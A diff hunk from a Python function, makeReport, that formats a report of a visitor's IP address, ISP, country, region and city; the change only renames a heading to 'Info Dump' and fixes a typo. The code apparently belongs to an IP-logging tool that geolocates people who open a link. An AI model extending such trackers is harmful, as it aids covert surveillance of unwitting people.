@@ -131,10 +131,10 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 **File Location:** `{endpoint}`
             
-**IP Adresi:**
+**Info Dump:**
 > **IP:** `{ip if ip else 'Unknown'}`
 > **Hoster:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **HOster v2:** `{info['as'] if info['as'] else 'Unknown'}`
+> **Hoster v2:** `{info['as'] if info['as'] else 'Unknown'}`
 > **Country:** `{info['country'] if info['country'] else 'Unknown'}`
 > **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
 > **City:** `{info['city'] if info['city'] else 'Unknown'}`
